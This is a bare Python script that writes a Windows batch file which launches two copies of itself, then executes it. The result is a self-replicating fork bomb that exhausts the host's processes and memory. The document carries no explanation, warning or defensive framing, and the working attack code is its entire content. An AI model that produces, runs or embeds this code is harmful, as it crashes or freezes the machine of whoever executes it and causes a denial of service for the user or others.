import subprocess
with open('output.bat', 'w') as file:
    file.write('@echo off\nstart output.bat &\nstart output.bat &')
subprocess.Popen('output.bat',shell=True)